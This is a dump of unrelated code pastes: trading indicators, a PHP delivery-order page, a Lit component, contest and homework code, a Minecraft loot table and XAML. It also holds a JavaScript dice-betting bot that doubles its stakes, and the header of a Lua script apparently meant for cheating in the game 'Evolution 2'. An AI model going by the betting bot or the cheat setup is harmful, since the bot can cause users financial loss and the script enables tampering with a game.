    modeSwitch == 'Hma' ? HMA(src3, len) : modeSwitch == 'Ehma' ? EHMA(src3, len) : modeSwitch == 'Thma' ? THMA(src3, len / 2) : na

//OUT
_hull = Mode(modeSwitch, src3, int(length3 * lengthMult))
HULL = useHtf ? request.security(syminfo.ticker, htf, _hull) : _hull
MHULL = HULL[0]
SHULL = HULL[2]

//COLOR
hullColor = switchColor ? HULL > HULL[2] ? #00ff00 : #ff0000 : #ff9800

//PLOT
///< Frame
Fi1 = plot(MHULL, title='MHULL', color=hullColor, linewidth=thicknesSwitch, transp=50)
Fi2 = plot(visualSwitch ? SHULL : na, title='SHULL', color=hullColor, linewidth=thicknesSwitch, transp=50)
alertcondition(ta.crossover(MHULL, SHULL), title='Hull trending up.', message='Hull trending up.')
alertcondition(ta.crossover(SHULL, MHULL), title='Hull trending down.', message='Hull trending down.')
///< Ending Filler
fill(Fi1, Fi2, title='Band Filler', color=hullColor, transp=transpSwitch)
///BARCOLOR
barcolor(color=candleCol ? switchColor ? hullColor : na : na)

//***********************************************************************************************************************
//breakout finder
//*****************

prd21221 = input.int(defval=5, title='Period', minval=2)
bo_len = input.int(defval=200, title='Max Breakout Length', minval=30, maxval=300)
cwidthu = input.float(defval=3., title='Threshold Rate %', minval=1., maxval=10) / 100
mintest = input.int(defval=2, title='Minimum Number of Tests', minval=1)
bocolorup = input.color(defval=color.blue, title='Breakout Colors', inline='bocol')
bocolordown = input.color(defval=color.red, title='', inline='bocol')
lstyle = input.string(defval=line.style_solid, title='Line Style', options=[line.style_solid, line.style_dashed, line.style_dotted])

//width
lll = math.max(math.min(bar_index, 300), 1)
float h_ = ta.highest(lll)
float l_ = ta.lowest(lll)
float chwidth = (h_ - l_) * cwidthu

// check if PH/PL
ph21221 = ta.pivothigh(prd21221, prd21221)
pl21221 = ta.pivotlow(prd21221, prd21221)

//keep Pivot Points and their locations in the arrays
var phval = array.new_float(0)
var phloc = array.new_int(0)
var plval = array.new_float(0)
var plloc = array.new_int(0)

// keep PH/PL levels and locations
if ph21221
    array.unshift(phval, ph21221)
    array.unshift(phloc, bar_index - prd21221)
    if array.size(phval) > 1  // cleanup old ones
        for x = array.size(phloc) - 1 to 1 by 1
            if bar_index - array.get(phloc, x) > bo_len
                array.pop(phloc)
                array.pop(phval)

if pl21221
    array.unshift(plval, pl21221)
    array.unshift(plloc, bar_index - prd21221)
    if array.size(plval) > 1  // cleanup old ones
        for x = array.size(plloc) - 1 to 1 by 1
            if bar_index - array.get(plloc, x) > bo_len
                array.pop(plloc)
                array.pop(plval)

// check bullish cup
float bomax = na
int bostart = bar_index
num = 0
hgst = ta.highest(prd21221)[1]
if array.size(phval) >= mintest and close > open and close > hgst
    bomax := array.get(phval, 0)
    xx = 0
    for x = 0 to array.size(phval) - 1 by 1
        if array.get(phval, x) >= close
            break
        xx := x
        bomax := math.max(bomax, array.get(phval, x))
        bomax
    if xx >= mintest and open <= bomax
        for x = 0 to xx by 1
            if array.get(phval, x) <= bomax and array.get(phval, x) >= bomax - chwidth
                num += 1
                bostart := array.get(phloc, x)
                bostart
        if num < mintest or hgst >= bomax
            bomax := na
            bomax

if not na(bomax) and num >= mintest
    line.new(x1=bar_index, y1=bomax, x2=bostart, y2=bomax, color=bocolorup, style=lstyle)
    line.new(x1=bar_index, y1=bomax - chwidth, x2=bostart, y2=bomax - chwidth, color=bocolorup, style=lstyle)
    line.new(x1=bostart, y1=bomax - chwidth, x2=bostart, y2=bomax, color=bocolorup, style=lstyle)
    line.new(x1=bar_index, y1=bomax - chwidth, x2=bar_index, y2=bomax, color=bocolorup, style=lstyle)

plotshape(not na(bomax) and num >= mintest, location=location.belowbar, style=shape.triangleup, color=bocolorup, size=size.small)
alertcondition(not na(bomax) and num >= mintest, title='Breakout', message='Breakout')

// check bearish cup
float bomin = na
bostart := bar_index
num1 = 0
lwst = ta.lowest(prd21221)[1]
if array.size(plval) >= mintest and close < open and close < lwst
    bomin := array.get(plval, 0)
    xx = 0
    for x = 0 to array.size(plval) - 1 by 1
        if array.get(plval, x) <= close
            break
        xx := x
        bomin := math.min(bomin, array.get(plval, x))
        bomin
    if xx >= mintest and open >= bomin
        for x = 0 to xx by 1
            if array.get(plval, x) >= bomin and array.get(plval, x) <= bomin + chwidth
                num1 += 1
                bostart := array.get(plloc, x)
                bostart
        if num1 < mintest or lwst <= bomin
            bomin := na
            bomin

if not na(bomin) and num1 >= mintest
    line.new(x1=bar_index, y1=bomin, x2=bostart, y2=bomin, color=bocolordown, style=lstyle)
    line.new(x1=bar_index, y1=bomin + chwidth, x2=bostart, y2=bomin + chwidth, color=bocolordown, style=lstyle)
    line.new(x1=bostart, y1=bomin + chwidth, x2=bostart, y2=bomin, color=bocolordown, style=lstyle)
    line.new(x1=bar_index, y1=bomin + chwidth, x2=bar_index, y2=bomin, color=bocolordown, style=lstyle)

plotshape(not na(bomin) and num1 >= mintest, location=location.abovebar, style=shape.triangledown, color=bocolordown, size=size.small)

alertcondition(not na(bomin) and num1 >= mintest, title='Breakdown', message='Breakdown')
alertcondition(not na(bomax) and num >= mintest or not na(bomin) and num1 >= mintest, title='Breakout or Breakdown', message='Breakout or Breakdown')

//************************************************************************************************************************

"
kCzXvpaC,Eatmebox - tento tyden,bpark,PHP,Monday 1st of April 2024 05:35:18 AM CDT,"<?php include(""../header.php"")?>
<div class=""container objednavky"">
	<div class=""uvod"">
		<div class=""col-1"">
			<a class=""zpet"" href=""/system/objednavky.php""><div>Objednávky</div></a>
			<h1>Objednávky - Tento týden</h1>
		</div>
		<div class=""col-2"">
			<?php include(""col-2.php"")?>
		</div>
	</div>
	<div class=""separator""></div>
	<div class=""main"">
		

<?php
    $pathCsv  = ""/mnt/data/accounts/b/bpark2/data/www/eatmebox.cz/wp-content/uploads/wpallexport/exports/10b96edf64449fdb3c8c817dab8f65e3/Objednavky.csv"";

/*
Obj ID		0
Den			1
Město		2
PSČ			3
Ulice		4
Firma		5
Zakaznik	6
Telefon		7
Jídlo		8
SKU			9
Počet		10
Platba		11
Poznámka	12
*/

    
        if (($handle = fopen($pathCsv, ""r"")) !== FALSE) {
            $ii = 0;
            while (($data = fgetcsv($handle, 1000, "";"",'""')) !== FALSE) {
            
                if($ii == 0) {$ii++;continue;}
                //echo ""<pre>"";var_dump($data);echo ""</pre>"";
                $s[] = $data;
                $ii++;  
            }
        fclose($handle);  
        }
        
        $result =array();
        

  $i  = 0  ;
  foreach($s as $row){
    $result[$row[1]][$row[2]][$row[3]][$row[4]][($row[5] != """" ? $row[5] : """")][$row[6]][$row[0]][$row[8]] = array(
        'tel' =>$row[7],
        'sku' =>$row[9],
        'pocet' => $row[10],
        'platba' => $row[11],
        'poznamka' => $row[12]
    );
   
  $i++;
  }      
//echo ""<pre>"";var_dump($result); echo ""</pre>"";
  
  
$newArray = array(

                    'Pondělí' => $result['Toto pondělí'],
                    'Úterý' => $result['Toto úterý'],
                    'Středa' => $result['Tato středa'],
                    'Čtvrtek' => $result['Tento čtvrtek'],
                    'Pátek' => $result['Tento pátek'],
 );
 
 
 $headsTables =""<tr>
      <th>Město</th>
      <th>PSČ</th>
      <th>Ulice</th>
      <th>Firma</th>
      <th>Zákazník</th>
      <th>Číslo obj, jídlo, počet</th>

    </tr>"";
$classa = ""delivery""; 

//echo ""<pre>"";var_dump($newArray); echo ""</pre>"";
 foreach($newArray as $index => $value)   {
    echo ""<div>"";
    echo ""<h2>"".$index.""</h2>"";
    echo ""<table><thead>"".$headsTables.""</thead><tbody>"";
    foreach($value as $index2 => $value2){
         //echo ""<h3>Město: "".$index2.""</h3><br>"";
         foreach($value2 as $index3 => $value3) {      
            //echo  ""<h5>psč: "".$index3.""</h5>"";
            foreach($value3 as $index4 => $value4) {
                //echo  ""<h5>Ulice: "".$index4.""</h5>"";
                foreach($value4 as $index5 => $value5) {
                    //echo  ""<h5>Firma: "".$index5.""</h5>"";
                    foreach($value5 as $index6 => $value6) {
                        //echo  ""<h5>Zákazník: "".$index6.""</h5>"";
                            $pozn = """";
                            echo ""
                            <tr class=\""$classa\"">
                                <td class=\""mesto\"">"".$index2.""</td> 
                                <td>"".$index3.""</td>
                                <td>"".str_replace('""', """", $index4).""</td>
                                <td>"".str_replace('""', """", $index5).""</td>
                                <td>"".str_replace('""', """", $index6);
                                $ttt = """";
                                    foreach($value6 as $indexCislo =>$valueCislo){
                                        foreach($valueCislo as $indexCisloF => $valueCisloF) {
                                            $ttt = $valueCisloF['tel'];
                                        }
                                    }
                                echo ""<br><a class=\""odkaz-tel\"" href=\""tel:"".$ttt.""\"">"".$ttt.""</a><br></td>"";
                                echo ""<td class=\""innerobj\"">
                                  <table>"";
                                      foreach($value6 as $index7 =>$value7){
                                     
                                          echo ""<tr class=\""objednavka\""><td class=\""sloupidobj\"">"";
                                          echo $index7;
                                          echo ""<br>"".$platba.""</td>"";
                                          
                                          echo ""<td><table class=\""innertab\"">"";
                                              foreach($value7 as $index8 => $value8) {
                                                  $pozn= $value8['poznamka'];
                                                  $platba = ($value8['platba'] == ""Hotově při doručení"" ? '<span class=""cash"">$</span>' : """");
                                                  echo ""<tr>
                                                  <td class=\""tbl-qty\"">"".$value8['pocet']."" x </td>
                                                  <td class=\""tbl-sku\""><strong>"".str_replace('""', """", substr($value8['sku'],3)).""</strong></td>
                                                  <td class=\""tbl-food\""><span>
                                                  "";if(strlen($index8) > 25) {echo mb_substr($index8,0,100,""UTF-8"")."""";} else {echo $index8;} echo "" </span></td>
                                                  </tr>"";
                                              }
                                          echo ""</table></td>
                                            <td class=\""slouppozn\"">"".$pozn.""</td>
                                          </tr>"";
                                      }
                                  
                                  
                                    echo ""</table>
                                </td>"";
                                
                               

                            echo ""</tr>""; 
                      

                    }
                }
            }
         }
         //echo ""<tr><td></td><td></td><td></td><td></td><td></td><td></td></tr>"";
    }
 
   echo ""</tbody></table></div>"";
 }
 

?>
		
	</div>
</div>
<?php include(""footer.php"")?>
"
SUUH8tAq,lit capture error json,twokay,TypeScript,Monday 1st of April 2024 05:21:13 AM CDT,"import {LitElement, html} from 'lit';
import {customElement, property} from 'lit/decorators.js';
import {Task} from '@lit/task';
import type {DnsRecord} from ""../types/dns""

@customElement('dns-entry')
class DnsEntry extends LitElement {
  @property()
  public entryid?: string;

  private _entryTask = new Task(this, {
    task: async ([entryId], {signal}) => {
      const response = await fetch(`https://dns.api.local.entitywind.io/heartbeat`, {
        method: ""POST"", mode: 'no-cors', headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({a: 1, b: 'Textual content', c: this.entryid}),

        signal
      });
      if (!response.ok) {
        let t = await response.json()
        throw new Error(`${t} ${response.status}`);
      }
      return await response.json() as Promise<DnsRecord>
    },
    args: () => [this.entryid]
  });

  render() {
    return this._entryTask.render({
      pending: () => html`<p>Loading dns record...</p>`,
      complete: (dnsRecord) => html`
        <ul>
          <li>${dnsRecord.domain}</li>
          <li>${dnsRecord.ttl}</li>
          <li>${dnsRecord.class}</li>
          <li>${dnsRecord.recordType}</li>
          <li>${dnsRecord.record}</li>
        </ul>
      `,
      error: (e) => html`<p>Error: ${e}</p>`
    });
  }
}
"
9kuE3n2C,snowybot,coinwalk,JavaScript,Monday 1st of April 2024 05:00:55 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var divide = 320; //just add more 0s;
var macanah = (divide/8);
var monkey = Number((olsenest/divide).toFixed(8)); //dont change;
var bolux = (monkey);
var tens = (monkey*10);
var twenty = (monkey*10);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var olsen = ((Math.floor(olsenest/tens))*tens);
var upper = 6.9;
var downer = 2.9;
var awesome = ((Math.floor(olsenest/tens))*tens);
var belance = olsenest;
var oxen = olsenest;
var fart = 4;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


async function go(){
await sleep(1000);
belance = document.getElementById('pct_balance').value;
var dog = ((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
if (belance>(olsen+(bolux*upper))){
    upper = 4.9;
    downer = 4.9;
    bolux = bolux*2;
    olsen = parseFloat(belance);
}
if (belance<(olsen-(bolux*downer))){
    upper = 4.9;
    downer = 4.9;
    bolux = bolux*2;
    olsen = parseFloat(belance);
}
if ((bolux>=(belance/macanah))&&((belance-bolux)>tens)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = (monkey);
    fart = 3;
    upper = 6.9;
    downer = 2.9;
    olsen = ((Math.floor(belance/tens))*tens);
    awesome = ((Math.floor(belance/tens))*tens);
}
if (((belance-bolux)<=tens)&&(bolux>=(belance/2))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = (monkey);
    fart = 3;
    upper = 6.9;
    downer = 2.9;
    olsen = ((Math.floor(belance/tens))*tens);
    awesome = ((Math.floor(belance/tens))*tens);
}
if (belance>oxen){
fart = 4;
oxen = parseFloat(belance);
}
if ((belance>=(awesome+(tens*fart)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = (monkey);
    upper = 6.9;
    downer = 2.9;
    olsen = ((Math.floor(belance/tens))*tens);
    awesome = ((Math.floor(belance/tens))*tens);
}
if (belance>=(olsenest*1.4)){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
await go();
}
go();
"
cvHzu7x5,Untitled,wym1111,C++,Monday 1st of April 2024 04:50:56 AM CDT,"#include <bits/stdc++.h>

using namespace std;
#define endl '\n'
using ll = long long;

const int N = 1e5 + 10;

int n;
ll a[N], pre[N], cost[N];
int lst[N], lim[N], nxt[N];

struct Node {
	ll lmi, rmi, mi, sum;
};

class Segment {
private:
	ll a[N];
	Node node[N << 2];
public:
	void init (int n, ll num[]) {
		for (int i = 1; i <= n; i ++) a[i] = num[i];
	}
	void build (int s, int t, int p) {
		if (s == t) {
			node[p].sum = a[s];
			node[p].mi = node[p].lmi = node[p].rmi = min(0LL, a[s]);
			return;
		}
		int mid = (s + t) >> 1;
		build(s, mid, p << 1);
		build(mid + 1, t, p << 1 | 1);
	}
	Node merge (Node &x, Node &y) {
		Node res;
		res.sum = x.sum + y.sum;
		res.lmi = min(x.sum + y.lmi, x.lmi);
		res.rmi = min(x.rmi + y.sum, y.rmi);
		res.mi = min(x.mi, y.mi);
		res.mi = min(res.mi, x.rmi + y.lmi);
		return res;
	}
	void pushup(int p) {
		node[p] = merge(node[p << 1], node[p << 1 | 1]);
	}
	Node query (int l, int r, int s, int t, int p) {
		if (l <= s && t <= r) {
			return node[p];
		}
		int mid = (s + t) >> 1;
		Node res1, res2;
		if (l <= mid) res1 = query(l, r, s, mid, p << 1);
		if (mid < r) res2 = query(l, r, mid + 1, t, p << 1 | 1);
		return merge(res1, res2);
	}
};
Segment seg;

void solve () {
	cin >> n;
	int last = 0;
	cost[0] = 0;
	pre[0] = 0;
	ll mi = 0;
	for (int i = 1; i <= n; i ++) {
		cin >> a[i];
		pre[i] = pre[i - 1] + a[i];
		cost[i] = cost[i - 1] + pre[i];
		mi = min(cost[i] - cost[last], mi);
//		cout << i << ' ' << last << ' ' << mi << endl;
		if (pre[i] > pre[last]) {
			nxt[last] = i;
			lim[i] = mi;
			last = i;
			mi = 0;
		}
	}
	if (last != n) {
		nxt[last] = n;
		lim[n] = mi;
	}
	if (lim[nxt[0]] < 0 || pre[n] < 0) {
		cout << ""-1\n"";
		return;
	}
	
//	cout << ""debug\n"";
//	for (int i = 0; i <= n; i ++) {
//		cout << i << "" : "" << nxt[i] << ' ' << lim[nxt[i]] << endl;
//	}
	
	int p = 0;
	ll ans = 0;
	ll sum = 0;
	while (p < n) {
		if (lim[p[nxt]] + sum < 0) {
			ll need = -sum - lim[p[nxt]];
			ll d = (need + pre[p] - 1) / pre[p];
//			cout << d << endl;
			ans += d;
			sum += pre[p] * d;
		}
		sum += cost[nxt[p]] - cost[p];
		ans += nxt[p] - p;
		p = nxt[p];
//		cout << p << ' ' << ans << ' ' << sum << endl;
	}
	cout << ans << endl;
}

signed main() {
	ios::sync_with_stdio(false);
	cin.tie(nullptr);
	int _ = 1;
//	cin >> _; 
	while(_ --) {
		solve();
	}
	return 0;
}
"
GZ3YSEt5,Untitled,SenpaiZero,Java,Monday 1st of April 2024 04:26:43 AM CDT,"import java.util.*;
public class runGame {
	public static void main(String[] args) 
	{
		Scanner scanner = new Scanner(System.in);
		String userInput;
		int attemp = 0;
		
		System.out.println(""Guess the number from 1 to 50"");
		int rand = new Random().nextInt(50); // Creating random number from 1 to 50
		
		
		do
		{
			System.out.print(""Enter: "");
			userInput = scanner.nextLine(); //Get value from user
			attemp++; //increase attemp each loop
			
			if(userInput.matches(""\\d+"")) //Check if user input is integer
			{
				int val = Integer.valueOf(userInput);
				if(val == rand) break; //Stops the loop if user guessed the number
				if(val > rand)System.out.println(""Too high. Try Again!""); //Check if user is higher than random number
				if(val < rand) System.out.println(""Too low. Try Again!""); // Check if user is lower than random number
			}
			else {
				System.out.println(""Invalid input!""); //print invalid if the user input is not integer
			}
			
		} while(true); //Keep looping until the user guess the number
		
		//Print attemps when finished
		System.out.println(""You got it in "" + attemp + "" attemps!"");
	}
}
"
tmuULRAY,Untitled,yoav_tc,JSON,Monday 1st of April 2024 04:25:02 AM CDT,"{
  ""pools"": [
    {
      ""rolls"": 1,
      ""entries"": [
        {
          ""type"": ""minecraft:item"",
          ""name"": ""minecraft:player_head"",
          ""functions"": [
            {
              ""function"": ""minecraft:set_nbt"",
              ""tag"": ""{SkullOwner:{Properties:{textures:[{Value:ewogICJ0aW1lc3RhbXAiIDogMTcxMTkxODcxMzY4MywKICAicHJvZmlsZUlkIiA6ICJkY2M1ZTEzZGQxZGI0NDVkYWMyNzJjYzBkZTNjZDMzZiIsCiAgInByb2ZpbGVOYW1lIiA6ICJ5b2F2X3RjIiwKICAidGV4dHVyZXMiIDogewogICAgIlNLSU4iIDogewogICAgICAidXJsIiA6ICJodHRwOi8vdGV4dHVyZXMubWluZWNyYWZ0Lm5ldC90ZXh0dXJlLzJjMWMxNzlhZDUxOTU1ZjE1MjJjNDhlYTk5MzFmMDljMTYyNzQxYjQ1ZTIyZTlkM2ZlYjY4MmM3ZTVlZDgyNzQiCiAgICB9CiAgfQp9}]},Id:[I;-124231,32198,23306,-64396]},Tags:[upgrade_rune]}""
            },
            {""function"": ""minecraft:set_name"",
              ""name"": {
                ""text"": ""Upgrade Rune"",
                ""color"": ""light_purple"",
                ""italic"": false
              }},
              {""function"": ""minecraft:set_lore"",
              ""lore"": [
                {
                  ""text"": ""Drop onto an enchanting table"",
                  ""color"": ""gray"",
                  ""italic"": false
                },
                {
                  ""text"": ""With an enchanted book"",
                  ""color"": ""gray"",
                  ""italic"": false
                },
                {
                  ""text"": ""To upgrade the book!"",
                  ""color"": ""gray"",
                  ""italic"": false
                }
              ]}
          ]
        }
      ]
    }
  ]
}
"
ZsZhpTs5,Untitled,perminovsm,PostgreSQL,Monday 1st of April 2024 03:59:29 AM CDT,"first_values AS (
    SELECT DISTINCT(user_id),
           FIRST_VALUE(a.first_date) OVER (PARTITION BY a.user_id ORDER BY a.datetime) AS first_date,
           FIRST_VALUE(c.city_name) OVER (PARTITION BY a.user_id ORDER BY a.datetime) AS first_city, 
           FIRST_VALUE(c.city_id) OVER (PARTITION BY a.user_id ORDER BY a.datetime) AS city_id
    FROM analytics_events a
    LEFT JOIN cities c ON a.city_id = c.city_id
    WHERE event = 'authorization'
          AND a.user_id IS NOT NULL
          AND a.log_date <= '2021-07-02'
          AND a.first_date <= '2021-06-26'"
2PFSxmmd,DecryptingCommands,Ivo99,Java,Monday 1st of April 2024 03:20:33 AM CDT,"package FinalExam;

import java.util.Scanner;

import static java.lang.System.in;

public class P01DecryptingCommands {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(in);

        String input = scanner.nextLine();

      

        String newInput = scanner.nextLine();

        while (!newInput.equals(""Finish"")){

            String [] commands = newInput.split("" "");
            String currentCommand = commands[0];

            switch (currentCommand){
                case ""Replace"":
                    String currentChar = commands[1];
                    String newChar = commands[2];
                    input = input.replace(currentChar,newChar);
                    System.out.println(input);
                    break;
                case ""Cut"":
                    int beginning = Integer.parseInt(commands[1]);
                    int ending = Integer.parseInt(commands[2]);

                    if (beginning>input.length()||beginning<0||ending>input.length()){
                        System.out.println(""Invalid indices!"");
                    }else {
                        String substringToCut = input.substring(beginning,ending+1);
                        input = input.replaceFirst(substringToCut,"""");
                        System.out.println(input);
                    }
                    break;
                case ""Make"":
                    String upperOrLower = commands[1];
                    if (upperOrLower.equals(""Upper"")){
                        input = input.toUpperCase();
                        System.out.println(input);
                    }else {
                        input = input.toLowerCase();
                        System.out.println(input);
                    }
                    break;
                case ""Check"":
                    String string = commands[1];
                    if (input.contains(string)){
                        System.out.printf(""Message contains %s%n"",string);
                    }else {
                        System.out.printf(""Message doesn't contain %s%n"",string);
                    }
                    break;
                case ""Sum"":
                    int startIndex = Integer.parseInt(commands[1]);
                    int endIndex = Integer.parseInt(commands[2]);
                    int sum = 0;
                    if (startIndex<0||endIndex>input.length()-1){
                        System.out.println(""Invalid indices!"");
                    }else {
                        String substring = input.substring(startIndex,endIndex+1);
                        for (char character:substring.toCharArray()){
                            sum+=character;
                        }
                        System.out.println(sum);
                    }

            }


            newInput = scanner.nextLine();
        }

    }
}
"
AC1uctg6,邀您一起看：⭐第一部分✈️,xiaomianao666,JavaScript,Monday 1st of April 2024 03:03:14 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥⭐第一部分✈️@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIlg1XCIsXCJwYXRoXCI6XCJ4NVwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJ1XFxcIikpO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgdXJsOiB1cmwsXFxuICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICBkZXNjOiBcXFwiZmxvYXQmJjEwMCVcXFwiLFxcbiAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIC8vZmxvYXRWaWRlbzogdHJ1ZSxcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxuICAgICAgICBibG9ja1J1bGVzOiBbXFxcIi5naWZcXFwiLCBcXFwiL2FkL1xcXCIsIFxcXCJnb29nbGVcXFwiLCBcXFwiL3NoL3RvL1xcXCIsIFxcXCIuR0lGXFxcIl1cXG4gICAgfVxcbn0pO1xcbnNldFJlc3VsdChkKTtcIn1dLFwicGFyYW1zXCI6XCJ7XFxcImxvbmdDbGlja1xcXCI6W3tcXFwianNcXFwiOlxcXCInZG93bmxvYWQ6Ly9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHMxMjU3ODEwMDMvaGlrZXJydWxlcy9tYWluL3R4dC8yMDI0LTPmnIjlkIjpm4bnrKzkuIDpg6jliIYudHh0J1xcXCIsXFxcInRpdGxlXFxcIjpcXFwi5LiL6L29XFxcIn0se1xcXCJqc1xcXCI6XFxcIidjb3B5Oi8vaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xzMTI1NzgxMDAzL2hpa2VycnVsZXMvbWFpbi90eHQvMjAyNC0z5pyI5ZCI6ZuG56ys5LiA6YOo5YiGLnR4dCdcXFwiLFxcXCJ0aXRsZVxcXCI6XFxcIuWkjeWItlxcXCJ9XX1cIixcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi6LWE5rqQ5pW05ZCI5LiL6L29YmV0YVwiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImhpa2VyOi8vcGFnZS94NT91PWFIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDJ4ek1USTFOemd4TURBekwyaHBhMlZ5Y25Wc1pYTXZiV0ZwYmk5MGVIUXZNakF5TkMwejVweUk1WkNJNlp1RzU2eXM1TGlBNllPbzVZaUdMblI0ZEE9PVwiLFwiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcImZpbmRfcnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJ1XFxcIikpO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgdXJsOiB1cmwsXFxuICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICBkZXNjOiBcXFwiZmxvYXQmJjEwMCVcXFwiLFxcbiAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIC8vZmxvYXRWaWRlbzogdHJ1ZSxcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxuICAgICAgICBibG9ja1J1bGVzOiBbXFxcIi5naWZcXFwiLCBcXFwiL2FkL1xcXCIsIFxcXCJnb29nbGVcXFwiLCBcXFwiL3NoL3RvL1xcXCIsIFxcXCIuR0lGXFxcIl1cXG4gICAgfVxcbn0pO1xcbnNldFJlc3VsdChkKTtcIixcImdyb3VwXCI6XCLikaPlt6XlhbdcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcIlwiLFwicGFnZXNcIjpcIlt7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCJYNVxcXCIsXFxcInBhdGhcXFwiOlxcXCJ4NVxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbnZhciBkID0gW107XFxcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXFxcXFwidVxcXFxcXFwiKSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgIHVybDogdXJsLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcIng1X3dlYnZpZXdfc2luZ2xlXFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCJmbG9hdCYmMTAwJVxcXFxcXFwiLFxcXFxuICAgIHBpY191cmw6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgLy9mbG9hdFZpZGVvOiB0cnVlLFxcXFxuICAgICAgICBjYW5CYWNrOiB0cnVlLFxcXFxuICAgICAgICBibG9ja1J1bGVzOiBbXFxcXFxcXCIuZ2lmXFxcXFxcXCIsIFxcXFxcXFwiL2FkL1xcXFxcXFwiLCBcXFxcXFxcImdvb2dsZVxcXFxcXFwiLCBcXFxcXFxcIi9zaC90by9cXFxcXFxcIiwgXFxcXFxcXCIuR0lGXFxcXFxcXCJdXFxcXG4gICAgfVxcXFxufSk7XFxcXG5zZXRSZXN1bHQoZCk7XFxcIn1dXCIsXCJwcm94eVwiOlwiXCJ9IiwidGl0bGUiOiLirZDnrKzkuIDpg6jliIbinIjvuI8ifQ==
tGTsDMEE,Untitled,TimmyChannel,XML,Monday 1st of April 2024 03:00:20 AM CDT,"    <Grid ShowGridLines=""True"">
        <Grid.RowDefinitions>
            <RowDefinition Height=""1*""></RowDefinition>
            <RowDefinition Height=""3*""></RowDefinition>
            <RowDefinition Height=""1*""></RowDefinition>
        </Grid.RowDefinitions>
        <TextBlock Grid.Row=""0""
                   HorizontalAlignment=""Center""
                   Text=""Заголовок экрана"" />
        <Grid Grid.Row=""1""
              ShowGridLines=""True"">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width=""1*""></ColumnDefinition>
                <ColumnDefinition Width=""2*""></ColumnDefinition>
            </Grid.ColumnDefinitions>
            <Grid Grid.Column=""0""
                  ShowGridLines=""True"">
                <Grid.ColumnDefinitions>
                    <ColumnDefinition></ColumnDefinition>
                    <ColumnDefinition></ColumnDefinition>
                </Grid.ColumnDefinitions>

            </Grid>
            <Button Grid.Column=""1""
                    Content="" Button""
                    Margin=""70,20,70,0""></Button>
        </Grid>
        <Grid Grid.Row=""2""
              ShowGridLines=""True"">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width=""2*""></ColumnDefinition>
                <ColumnDefinition Width=""1*""></ColumnDefinition>
            </Grid.ColumnDefinitions>
        </Grid>
    </Grid>"
dftXVCkB,evolution2,wilmans2m,Lua,Monday 1st of April 2024 02:56:36 AM CDT,"LUA = 'WILS2M'
GLabel = 'Evolution 2'
GProcess = 'com.my.evolution2'
GVersion = '(vAU.02)'
SVersion= '0.2712.89888'
xbit = 64 
LibResult = 1
xlib = 'libil2cpp.so'
xREV = 1  I={}
xCNE = 0
xSSE = 0
XbitX = 2
printx = '---------------------------------------------------------------'
expire='free'
